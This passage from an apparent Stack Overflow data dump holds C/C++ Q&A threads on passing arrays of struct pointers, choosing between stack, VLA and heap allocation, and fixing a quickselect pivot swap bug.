153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1459408678, "post_id": 36303828, "comment_id": 60275711, "body": "@Lundin Sure, I guess we could go on and discuss corner cases (really how common is the usage of <code>void func (int array [static 5])</code>, there are other better practical solutions IMO...). We agree to disagree, I think we should keep it at that then."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 3852, "user_id": 921723, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38e3b1e32ece685d794a2d839300166c?s=128&d=identicon&r=PG", "display_name": "Jite", "link": "https://stackoverflow.com/users/921723/jite"}, "edited": false, "score": 0, "creation_date": 1459409589, "post_id": 36303828, "comment_id": 60276288, "body": "@Jite Yes it is barely ever used, but it is an example which shows that parameters must be regarded as arrays, even though they decay into pointers."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1459409809, "post_id": 36303828, "comment_id": 60276417, "body": "(Also I doubt Linus Torvalds ever used a static analyser, so he is oblivious to the increased type safety argument. If you used one on the Linux kernel, the analyser would probably implode.)"}], "answers": [{"comments": [{"owner": {"reputation": 357, "user_id": 4260141, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1f1307fc5a0640520f82a09fc9b44675?s=128&d=identicon&r=PG", "display_name": "datapanda", "link": "https://stackoverflow.com/users/4260141/datapanda"}, "edited": false, "score": 0, "creation_date": 1459328528, "post_id": 36303886, "comment_id": 60232094, "body": "does <code>functionB(struct1 ** point, ...)</code> and <code>functionB(struct1 *point[ ], ...)</code> would mean the same ? given both of them are pointers to pointers"}, {"owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "edited": false, "score": 0, "creation_date": 1459328948, "post_id": 36303886, "comment_id": 60232383, "body": "Yes. Both are same as a function parameter."}], "tags": [], "owner": {"reputation": 962, "user_id": 1891266, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/83ed20378bcbcf07ccc4969c6bf9874b?s=128&d=identicon&r=PG", "display_name": "vcp", "link": "https://stackoverflow.com/users/1891266/vcp"}, "is_accepted": false, "score": -2, "last_activity_date": 1459327669, "creation_date": 1459327669, "answer_id": 36303886, "question_id": 36303828, "link": "https://stackoverflow.com/questions/36303828/passing-an-array-of-pointers-to-a-struct-to-a-function/36303886#36303886", "title": "Passing an array of pointers to a struct to a function", "body": "<p>Here is one way of doing it:</p>\n\n<pre><code>void functionA(argument1, argument2) {\n   ...\n   struct1 *point[2];\n   ...\n\n   functionB(point, ...) // Call the function ?\n}\n\n// Declare the function ?\nvoid functionB(struct1 ** point, ...) {\n\n  // Use point[1] and point[2] here\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "reply_to_user": {"reputation": 357, "user_id": 4260141, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1f1307fc5a0640520f82a09fc9b44675?s=128&d=identicon&r=PG", "display_name": "datapanda", "link": "https://stackoverflow.com/users/4260141/datapanda"}, "edited": false, "score": 0, "creation_date": 1459332266, "post_id": 36303951, "comment_id": 60234839, "body": "A comment would be appreciated if anything is wrong with this answer."}], "tags": [], "owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "is_accepted": true, "score": 2, "last_activity_date": 1459332189, "last_edit_date": 1459332189, "creation_date": 1459327842, "answer_id": 36303951, "question_id": 36303828, "link": "https://stackoverflow.com/questions/36303828/passing-an-array-of-pointers-to-a-struct-to-a-function/36303951#36303951", "title": "Passing an array of pointers to a struct to a function", "body": "<p>Your function call is wrong. <code>functionB</code> is expecting its argument of type <code>struct1 **</code> but you are passing an argument of type <code>struct1 *</code>. Function call should be  </p>\n\n<pre><code>functionB(point, ...);  \n</code></pre>\n\n<p>You should know that as per C rule, when an array is passed to a function then array decays to pointer to it's first element. <code>point</code> in function call will decay and will have type <code>struct1 **</code> after decaying.</p>\n"}, {"tags": [], "owner": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "is_accepted": false, "score": -2, "last_activity_date": 1459327900, "creation_date": 1459327900, "answer_id": 36303970, "question_id": 36303828, "link": "https://stackoverflow.com/questions/36303828/passing-an-array-of-pointers-to-a-struct-to-a-function/36303970#36303970", "title": "Passing an array of pointers to a struct to a function", "body": "<p>When you need to send an array to a function, you just have to send the base address of that array (i.e. the name) to that function, and then receive it using a pointer to that type. And this rule applies to every data type, be it an <code>int</code> or a <code>struct</code>.</p>\n\n<hr>\n\n<p>So, You can do</p>\n\n<pre><code>void functionA(argument1, argument2) {\n   ...\n   struct1 *point[2];\n   ...\n\n   functionB(point, ...) // Sending base address of array point\n}\n\n// Recieve it this way\nvoid functionB(struct1 *point[], ...) {\n\n// Or\nvoid functionB(struct1 **point, ...) {\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": false, "score": -2, "last_activity_date": 1459328825, "last_edit_date": 1459328825, "creation_date": 1459328292, "answer_id": 36304106, "question_id": 36303828, "link": "https://stackoverflow.com/questions/36303828/passing-an-array-of-pointers-to-a-struct-to-a-function/36304106#36304106", "title": "Passing an array of pointers to a struct to a function", "body": "<p>Function <code>functionB</code> is declared as having the first parameter of type <code>struct1 *point[]</code></p>\n\n<pre><code>void functionB(struct1 *point[], ...) {\n\n\n}\n</code></pre>\n\n<p>And the array <code>point</code> has the same type of elements.</p>\n\n<p>So you just need to use the name of the array as the argument for the function call</p>\n\n<pre><code>functionB(point, ...) // Call the function ?\n</code></pre>\n\n<p>Take into account that parameters declared as arrays are adjucted to pointers to their elements.</p>\n\n<p>Thus this function declarations</p>\n\n<pre><code>void functionB(struct1 *point[], ...);\n</code></pre>\n\n<p>and</p>\n\n<pre><code>void functionB(struct1 **point, ...);\n</code></pre>\n\n<p>are equivalent and declare the same one function.</p>\n\n<p>On the other hand array designators used in expressions are converted to pointers to their first elements. So the expression <code>point</code> used as an argument is converted to pointer of type <code>struct1 **</code> that is it exactly corresponds to the expected by the function argument according to its declaration.</p>\n"}], "owner": {"reputation": 357, "user_id": 4260141, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1f1307fc5a0640520f82a09fc9b44675?s=128&d=identicon&r=PG", "display_name": "datapanda", "link": "https://stackoverflow.com/users/4260141/datapanda"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 170, "favorite_count": 0, "accepted_answer_id": 36303951, "answer_count": 4, "score": 0, "last_activity_date": 1459332189, "creation_date": 1459327469, "last_edit_date": 1459328019, "question_id": 36303828, "link": "https://stackoverflow.com/questions/36303828/passing-an-array-of-pointers-to-a-struct-to-a-function", "title": "Passing an array of pointers to a struct to a function", "body": "<p>I have a function where an array of pointers to a struct is declared</p>\n\n<pre><code>void functionA(argument1, argument2) {\n   ...\n   struct1 *point[2];\n   ...\n\n   functionB(*point, ...) // Call the function ?\n}\n\n// Declare the function ?\nvoid functionB(struct1 *point[], ...) {\n\n\n}\n</code></pre>\n\n<p>I need to pass this array <code>*point[2]</code> to another function say functionB where i need to so some operations based on the <code>point[0]</code> and <code>point[1]</code> what is the correct way to do this ?</p>\n\n<p>When I am calling the <code>functionB</code> in <code>functionA</code> like <code>functionB(*point, ...)</code>, I am getting the error of <strong>incompatible pointer types</strong> whereas when I am calling it like <code>functionB(*point[], ...)</code> I am getting the error that <strong>expected expression before <code>]</code> token</strong>.</p>\n"}, {"tags": ["c++", "c", "allocation"], "comments": [{"owner": {"reputation": 4268, "user_id": 5897829, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c2c7105808cb099e98f04fe464af68c6?s=128&d=identicon&r=PG&f=1", "display_name": "Martin Verjans", "link": "https://stackoverflow.com/users/5897829/martin-verjans"}, "edited": false, "score": 1, "creation_date": 1459326868, "post_id": 36303529, "comment_id": 60231016, "body": "Use a timer to count the time it takes for the three different methods... Although I would definitely ban number 2 <code>array[1000000]</code> as if you have only 1 data you loose lots of memory..."}, {"owner": {"reputation": 8251, "user_id": 2912665, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/XrRhd.jpg?s=128&g=1", "display_name": "CinCout", "link": "https://stackoverflow.com/users/2912665/cincout"}, "edited": false, "score": 0, "creation_date": 1459326990, "post_id": 36303529, "comment_id": 60231081, "body": "You are using variable length array in first method!"}, {"owner": {"reputation": 59891, "user_id": 1207195, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Q3P4g.jpg?s=128&g=1", "display_name": "Adriano Repetti", "link": "https://stackoverflow.com/users/1207195/adriano-repetti"}, "edited": false, "score": 5, "creation_date": 1459327092, "post_id": 36303529, "comment_id": 60231138, "body": "Do you really care about execution time when using user input?! Will you ever notice any difference?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1459327111, "post_id": 36303529, "comment_id": 60231145, "body": "You should ask yourself if it is really worth optimizing here. What does your program do with the the scanfed data ?"}, {"owner": {"reputation": 1141, "user_id": 5268808, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/WE63u.png?s=128&g=1", "display_name": "secretgenes", "link": "https://stackoverflow.com/users/5268808/secretgenes"}, "edited": false, "score": 0, "creation_date": 1459327339, "post_id": 36303529, "comment_id": 60231296, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/24909753/c-memory-allocation-for-arrays\">C++ memory allocation for arrays</a>"}, {"owner": {"reputation": 1141, "user_id": 5268808, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/WE63u.png?s=128&g=1", "display_name": "secretgenes", "link": "https://stackoverflow.com/users/5268808/secretgenes"}, "edited": false, "score": 0, "creation_date": 1459327374, "post_id": 36303529, "comment_id": 60231322, "body": "<a href=\"http://stackoverflow.com/questions/161053/which-is-faster-stack-allocation-or-heap-allocation\" title=\"which is faster stack allocation or heap allocation\">stackoverflow.com/questions/161053/&hellip;</a>"}, {"owner": {"reputation": 5, "user_id": 4284741, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/100001258697205/picture?type=large", "display_name": "Tudorut Robert", "link": "https://stackoverflow.com/users/4284741/tudorut-robert"}, "reply_to_user": {"reputation": 59891, "user_id": 1207195, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Q3P4g.jpg?s=128&g=1", "display_name": "Adriano Repetti", "link": "https://stackoverflow.com/users/1207195/adriano-repetti"}, "edited": false, "score": 0, "creation_date": 1459327827, "post_id": 36303529, "comment_id": 60231601, "body": "@AdrianoRepetti The program that I am currently writing has to have a maximal execution time, basically I want things to load faster at a small cost of CPU. Assuming that I have enoguh memory."}, {"owner": {"reputation": 59891, "user_id": 1207195, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Q3P4g.jpg?s=128&g=1", "display_name": "Adriano Repetti", "link": "https://stackoverflow.com/users/1207195/adriano-repetti"}, "edited": false, "score": 0, "creation_date": 1459328142, "post_id": 36303529, "comment_id": 60231832, "body": "@TudorutRobert if your program has such <b>strict timing requirements</b> then stack array allocation (but where array is allocated is implementation defined) is slightly faster (that&#39;s why it&#39;s what usually done in real-time environments). Note that VLA may be stack allocated too (implementation defined) and they have slightly better performance vs malloc() but they have many other drawbacks. However, in this case, first of all limit answers to C or C++ and describe your specific architecture and requirements. A <i>general</i> answer in this case is just useless."}, {"owner": {"reputation": 17408, "user_id": 2881849, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5a2fd0122f50f7582be15be3062c5b71?s=128&d=identicon&r=PG&f=1", "display_name": "MikeMB", "link": "https://stackoverflow.com/users/2881849/mikemb"}, "edited": false, "score": 2, "creation_date": 1459328627, "post_id": 36303529, "comment_id": 60232155, "body": "Is this a C or C++ question?"}], "answers": [{"comments": [{"owner": {"reputation": 5, "user_id": 4284741, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/100001258697205/picture?type=large", "display_name": "Tudorut Robert", "link": "https://stackoverflow.com/users/4284741/tudorut-robert"}, "edited": false, "score": 0, "creation_date": 1459327144, "post_id": 36303674, "comment_id": 60231168, "body": "In C++ i tried it with cin&gt;&gt;x; int array[x]; and it compiles just fine.(i assumed that it works the same in C)"}, {"owner": {"reputation": 59891, "user_id": 1207195, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Q3P4g.jpg?s=128&g=1", "display_name": "Adriano Repetti", "link": "https://stackoverflow.com/users/1207195/adriano-repetti"}, "edited": false, "score": 1, "creation_date": 1459327185, "post_id": 36303674, "comment_id": 60231199, "body": "@CodeFuller also in C (starting from C99) it&#39;s valid (and it has been a GCC extension as well). Oh, BTW...do you really really think you can measure performance difference between new and malloc? It&#39;s slower (true) but because it does something else..."}, {"owner": {"reputation": 27293, "user_id": 5740031, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Una92.jpg?s=128&g=1", "display_name": "CodeFuller", "link": "https://stackoverflow.com/users/5740031/codefuller"}, "edited": false, "score": 1, "creation_date": 1459327586, "post_id": 36303674, "comment_id": 60231456, "body": "Well, may be int array[x] could be compiled with gcc, but standard c++ doesn&#39;t support this. In VS you&#39;ll get error &#39;error C2133: &#39;array&#39; : unknown size&#39;."}, {"owner": {"reputation": 3343, "user_id": 1983409, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/T95Sg.jpg?s=128&g=1", "display_name": "zdf", "link": "https://stackoverflow.com/users/1983409/zdf"}, "reply_to_user": {"reputation": 5, "user_id": 4284741, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/100001258697205/picture?type=large", "display_name": "Tudorut Robert", "link": "https://stackoverflow.com/users/4284741/tudorut-robert"}, "edited": false, "score": 0, "creation_date": 1459328020, "post_id": 36303674, "comment_id": 60231755, "body": "@TudorutRobert I would avoid VLA. Even if some compilers don&#39;t complain. VLA is a standard feature of c99. In c++11 is <i><a href=\"https://en.wikipedia.org/wiki/Variable-length_array\" rel=\"nofollow noreferrer\">a conditional feature which implementations are not required to support</a></i>"}, {"owner": {"reputation": 69264, "user_id": 256138, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/ed9e8c0ff767e38f8fade11f5af00a45?s=128&d=identicon&r=PG", "display_name": "rubenvb", "link": "https://stackoverflow.com/users/256138/rubenvb"}, "edited": false, "score": 0, "creation_date": 1459328107, "post_id": 36303674, "comment_id": 60231799, "body": "@CodeFuller as Adriano said, it&#39;s valid C (since C99). The fact that C++ doesn&#39;t allow this or the fact that the Microsoft compiler gives an error is irrelevant to the fact that variable-length arrays are a valid C language construct. Nonetheless, what I agree with what ZDF says."}, {"owner": {"reputation": 1203, "user_id": 6105043, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9590c13dc07ee5a556e0d9ee36711499?s=128&d=identicon&r=PG", "display_name": "Elijan9", "link": "https://stackoverflow.com/users/6105043/elijan9"}, "edited": false, "score": 0, "creation_date": 1459334642, "post_id": 36303674, "comment_id": 60236554, "body": "Since C11 Variable Length Arrays are no longer mandatory for C, see <a href=\"https://en.wikipedia.org/wiki/C11_(C_standard_revision)\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/C11_(C_standard_revision)</a> VS has never had a fully compliant C99 compiler especially with regards to VLA."}], "tags": [], "owner": {"reputation": 27293, "user_id": 5740031, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Una92.jpg?s=128&g=1", "display_name": "CodeFuller", "link": "https://stackoverflow.com/users/5740031/codefuller"}, "is_accepted": false, "score": 1, "last_activity_date": 1459327699, "last_edit_date": 1459327699, "creation_date": 1459327051, "answer_id": 36303674, "question_id": 36303529, "link": "https://stackoverflow.com/questions/36303529/c-c-allocation/36303674#36303674", "title": "C/C++ Allocation", "body": "<p>You'll get compilation error for this code:</p>\n\n<pre><code>scanf(\"%d\", &amp;x);\nint array[x];\n</code></pre>\n\n<p>x should be known at compilation time in this case.</p>\n\n<p>When using <code>int array[1000000]</code> you allocate memory on the stack, not in the heap, so it's fundamental difference comparing to <code>malloc</code> or <code>new operator</code>. It would be faster because it takes actually only one CPU command of modifying stack pointer.</p>\n\n<p>If comparing <code>malloc</code> and <code>new</code>, <code>malloc</code> will be faster because new will eventually call <code>malloc</code> inside. But the performance gain will be tiny, It doesn't worth to optimize your c++ program in this way, just use c++ when you need to allocate dynamic memory.</p>\n"}, {"tags": [], "owner": {"reputation": 61429, "user_id": 572743, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/9941673f566f229bc536c1c2b558884e?s=128&d=identicon&r=PG&f=1", "display_name": "Damon", "link": "https://stackoverflow.com/users/572743/damon"}, "is_accepted": true, "score": 1, "last_activity_date": 1459329544, "creation_date": 1459329544, "answer_id": 36304533, "question_id": 36303529, "link": "https://stackoverflow.com/questions/36303529/c-c-allocation/36304533#36304533", "title": "C/C++ Allocation", "body": "<p>Since there appears <code>scanf</code> (and the comments assume that there's another million calls to <code>scanf</code>) any questions regarding the memory allocation in combination with \"Which is fastest?\" can be universally answered with: \"Yes\" (read as: irrelevant).</p>\n\n<p>While automatic storage (\"stack allocation\") is generally faster than freestore, it is entirely insignificant compared to the time you will spend in <code>scanf</code>. That being said, it is usually (not necessarily, but usually) dynamic <em>deallocation</em> which is slow, not allocation.</p>\n\n<p>A couple of points to note in general on that code:</p>\n\n<ol>\n<li>Reading an integer from some external source (file, network, argv, whatever) and doing an allocation based on that number <strong>without doing a sanity check</strong> first is massively bad karma. This is bound to cause a problem one day, it is how many existing real-world exploits came into being. Do not trust blindly that any number that you got from somewhere is automatically valid. Even if no malice is involved, <em>accident</em> may still provide an invalid number which will cause catastrophic failure.</li>\n<li>Allocating a non-constant sized array on the stack will work under recent versions of C and will \"work\" as an extension even under C++ if you use GCC, but it is normally not allowable in C++ (meaning it will fail to compile).</li>\n<li>Allocating a million integers means roughly 4MB of memory, which is pretty harsh towards your maximum stack size (often only 1MB). <em>Expect a stack overflow happening</em>.</li>\n<li>Allocating an <em>unknown</em> number of integers (but expecting the number to be up to a million) is similar to (3).</li>\n<li>The worst thing re (3) and (4) is that <em>it may actually succeed</em>. Which possibly means your program will unexpectedly crash later (encountering a stack overflow), in an entirely unrelated innocent piece of code. And you will wonder why that happens, since the code that crashes looks like it is perfectly valid (and it is, indeed!).</li>\n</ol>\n"}], "owner": {"reputation": 5, "user_id": 4284741, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/100001258697205/picture?type=large", "display_name": "Tudorut Robert", "link": "https://stackoverflow.com/users/4284741/tudorut-robert"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 110, "favorite_count": 0, "accepted_answer_id": 36304533, "answer_count": 2, "score": -3, "last_activity_date": 1459329544, "creation_date": 1459326651, "question_id": 36303529, "link": "https://stackoverflow.com/questions/36303529/c-c-allocation", "title": "C/C++ Allocation", "body": "<p>Giving a number X and reading X numbers into an uni-dimensional array, which of the following ways is the best(fastest as execution time)?</p>\n\n<p>Please note that X is a number between 1 and 1000000</p>\n\n<pre><code>scanf(\"%d\", &amp;x);\nint array[x];\n//continue reading X numbers into array\n</code></pre>\n\n<p>Or</p>\n\n<pre><code>scanf(\"%d\", &amp;x);\nint array[1000000];\n//continue reading X ...\n</code></pre>\n\n<p>Or</p>\n\n<pre><code>scanf(\"%d\", &amp;x);\nint * array = malloc(x*sizeof(int));\n//same as above\nfree(array);\n</code></pre>\n\n<p>Or the C++ dynamic allocation method?</p>\n\n<p>Note 1: that I am posting this from a mobile phone, I hope the format for the code above is fine, if not, I ask nicely somebody (&lt;3) to edit it, since it is painfull to indent code from a phone.</p>\n\n<p>Note 2: How could I test what I asked above?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1459325849, "post_id": 36303139, "comment_id": 60230418, "body": "It would be more obvious what went wrong if your array contained something not-at-all convertible to <code>int</code>. The former code wouldn&#39;t <i>compile</i> if that were the case, while the latte would stand a fighting chance."}, {"owner": {"reputation": 15260, "user_id": 1968182, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/E5nF2.jpg?s=128&g=1", "display_name": "Ulrich Eckhardt", "link": "https://stackoverflow.com/users/1968182/ulrich-eckhardt"}, "edited": false, "score": 0, "creation_date": 1459326169, "post_id": 36303139, "comment_id": 60230599, "body": "Define &quot;goes wrong&quot;, i.e. what&#39;s the result and what did you expect. Also, the expression contains several subexpressions. Which of these subexpressions does not have the value you would have expected?"}], "answers": [{"comments": [{"owner": {"reputation": 801, "user_id": 6078745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/09e9743aa6f4ee0f30e47abd7a60a69d?s=128&d=identicon&r=PG&f=1", "display_name": "Mario Dekena", "link": "https://stackoverflow.com/users/6078745/mario-dekena"}, "edited": false, "score": 0, "creation_date": 1459325861, "post_id": 36303186, "comment_id": 60230424, "body": "One could also write: swap(arr + middle, arr +beg);"}, {"owner": {"reputation": 121, "user_id": 6052592, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5462b39d4ef79f604c50fe99a92cd96f?s=128&d=identicon&r=PG&f=1", "display_name": "walle", "link": "https://stackoverflow.com/users/6052592/walle"}, "edited": false, "score": 0, "creation_date": 1459326323, "post_id": 36303186, "comment_id": 60230686, "body": "Thanks very much! I&#39;ll be careful about this!"}, {"owner": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "reply_to_user": {"reputation": 121, "user_id": 6052592, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5462b39d4ef79f604c50fe99a92cd96f?s=128&d=identicon&r=PG&f=1", "display_name": "walle", "link": "https://stackoverflow.com/users/6052592/walle"}, "edited": false, "score": 0, "creation_date": 1459326354, "post_id": 36303186, "comment_id": 60230706, "body": "@dongxingshi, Did you understand the problem?"}, {"owner": {"reputation": 121, "user_id": 6052592, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5462b39d4ef79f604c50fe99a92cd96f?s=128&d=identicon&r=PG&f=1", "display_name": "walle", "link": "https://stackoverflow.com/users/6052592/walle"}, "edited": false, "score": 0, "creation_date": 1459326833, "post_id": 36303186, "comment_id": 60230991, "body": "@Haris Yes! I didn&#39;t swap the two numbers in the array but simply  one number in array."}, {"owner": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "reply_to_user": {"reputation": 121, "user_id": 6052592, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5462b39d4ef79f604c50fe99a92cd96f?s=128&d=identicon&r=PG&f=1", "display_name": "walle", "link": "https://stackoverflow.com/users/6052592/walle"}, "edited": false, "score": 0, "creation_date": 1459326865, "post_id": 36303186, "comment_id": 60231010, "body": "@dongxingshi, Yes. Nice. Have fun coding. :)"}, {"owner": {"reputation": 121, "user_id": 6052592, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5462b39d4ef79f604c50fe99a92cd96f?s=128&d=identicon&r=PG&f=1", "display_name": "walle", "link": "https://stackoverflow.com/users/6052592/walle"}, "edited": false, "score": 0, "creation_date": 1459326915, "post_id": 36303186, "comment_id": 60231041, "body": "@Haris I really appreciate your time and patience!"}, {"owner": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "reply_to_user": {"reputation": 121, "user_id": 6052592, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5462b39d4ef79f604c50fe99a92cd96f?s=128&d=identicon&r=PG&f=1", "display_name": "walle", "link": "https://stackoverflow.com/users/6052592/walle"}, "edited": false, "score": 0, "creation_date": 1459326950, "post_id": 36303186, "comment_id": 60231062, "body": "@dongxingshi, Thanks.. :)"}], "tags": [], "owner": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "is_accepted": true, "score": 2, "last_activity_date": 1459325643, "creation_date": 1459325643, "answer_id": 36303186, "question_id": 36303139, "link": "https://stackoverflow.com/questions/36303139/why-middle-arrbeg-end-2-goes-wrong/36303186#36303186", "title": "why &quot;middle = arr[(beg + end) / 2]&quot; goes wrong?", "body": "<p>It goes wrong because of this line, (and similar ones later)</p>\n\n<pre><code>swap(&amp;middle, &amp;arr[beg]);\n</code></pre>\n\n<p><code>middle</code> is a separate variable, and when you swap using the above way, the actual element in the array (<code>array[middle]</code>) is not getting swapped (which you need).</p>\n\n<hr>\n\n<p>You want to swap the elements in the index <code>beg</code> and <code>middle</code> of array. That can be achieved by doing</p>\n\n<pre><code>swap(&amp;arr[middle], &amp;arr[beg]);\n</code></pre>\n"}], "owner": {"reputation": 121, "user_id": 6052592, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5462b39d4ef79f604c50fe99a92cd96f?s=128&d=identicon&r=PG&f=1", "display_name": "walle", "link": "https://stackoverflow.com/users/6052592/walle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "accepted_answer_id": 36303186, "answer_count": 1, "score": 1, "last_activity_date": 1459325900, "creation_date": 1459325445, "last_edit_date": 1459325848, "question_id": 36303139, "link": "https://stackoverflow.com/questions/36303139/why-middle-arrbeg-end-2-goes-wrong", "title": "why &quot;middle = arr[(beg + end) / 2]&quot; goes wrong?", "body": "<p>I was implementing <code>quick_select</code> in c, but my code went wrong and it took me a very long time to find out why,but I still cannot understand.</p>\n\n<p>The function <code>get_pivot</code> is to find a pivot for <code>quick_select</code>,here is the wrong code:</p>\n\n<pre><code>int get_pivot(int*arr, int beg, int end)\n{\n\n    int middle = arr[(beg + end) / 2];                    \n    if (middle &lt; arr[beg])\n      swap(&amp;middle, &amp;arr[beg]);\n    if (arr[end] &lt; arr[beg])\n      swap(&amp;arr[beg], &amp;arr[end]);\n    if (middle&gt;arr[end])\n      swap(&amp;middle, &amp;arr[end]);\n    swap(&amp;middle, &amp;arr[end - 1]);\n    return arr[end - 1];\n}\n</code></pre>\n\n<p>This function is designed to find out the middle number of 3 and move pivot to the end.</p>\n\n<p>However,it went wrong (I mean the <code>quick_select</code> output unsorted array)until I replaced <code>int middle = arr[(beg + end) / 2];</code>with\n<code>int middle=(beg+end)/2</code> and use <code>arr[middle]</code> instead of <code>middle</code>.Here is the right code:</p>\n\n<pre><code>int get_pivot(int*arr, int beg, int end)\n{\n\n    int middle = (beg + end) / 2;                  \n    if (arr[middle] &lt; arr[beg])\n        swap(&amp;arr[middle], &amp;arr[beg]);\n    if (arr[end] &lt; arr[beg])\n        swap(&amp;arr[beg], &amp;arr[end]);\n    if (arr[middle]&gt;arr[end])\n        swap(&amp;arr[middle], &amp;arr[end]);\n    //hide pivot\n    swap(&amp;arr[middle], &amp;arr[end - 1]);\n\n    return arr[end - 1];\n}\n</code></pre>\n\n<p>I don't understand why <code>int middle = arr[(beg + end) / 2];</code>goes wrong.</p>\n\n<p>I really appreciate you help!</p>\n"}, {"tags": ["c", "x86", "buffer-overflow"], "comments": [{"owner": {"reputation": 15165, "user_id": 1116364, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/b67dfca0caba03083330d39a304b1766?s=128&d=identicon&r=PG", "display_name": "Daniel Jour", "link": "https://stackoverflow.com/users/1116364/daniel-jour"}, "edited": 